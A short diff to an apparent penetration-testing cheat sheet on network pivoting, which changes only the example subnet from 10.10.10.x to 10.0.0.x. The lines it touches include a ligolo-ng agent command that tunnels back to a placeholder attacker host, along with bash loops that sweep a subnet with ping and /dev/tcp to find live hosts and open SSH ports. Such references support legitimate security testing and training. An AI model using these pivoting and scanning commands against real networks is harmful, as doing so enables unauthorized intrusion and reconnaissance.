@@ -193,7 +193,7 @@ ligolo-proxy -selfcert -laddr 0.0.0.0:11601
 ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
 
 # On attacker: add route to internal network
-sudo ip route add 10.10.10.0/24 dev ligolo
+sudo ip route add 10.0.0.0/24 dev ligolo
 ```
 
 ### socat (Swiss army knife)
@@ -220,12 +220,12 @@ done
 
 # Subnet sweep for live hosts
 for i in $(seq 1 254); do
-  (ping -c 1 -W 1 10.10.10.$i > /dev/null 2>&1 && echo "10.10.10.$i alive") &
+  (ping -c 1 -W 1 10.0.0.$i > /dev/null 2>&1 && echo "10.0.0.$i alive") &
 done; wait
 
 # Using /dev/tcp for host discovery (no ping needed)
 for i in $(seq 1 254); do
-  (echo >/dev/tcp/10.10.10.$i/22) 2>/dev/null && echo "10.10.10.$i:22 open" &
+  (echo >/dev/tcp/10.0.0.$i/22) 2>/dev/null && echo "10.0.0.$i:22 open" &
 done; wait
 ```
 
